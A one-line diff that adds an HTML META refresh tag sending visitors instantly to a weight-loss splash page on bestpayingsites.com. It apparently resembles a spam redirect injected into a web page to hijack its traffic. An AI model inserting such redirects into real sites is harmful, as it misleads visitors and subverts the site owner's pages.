@@ -1,0 +1,1 @@
+<META http-equiv="refresh" content="0;URL=http://bestpayingsites.com/splash/loseweight">
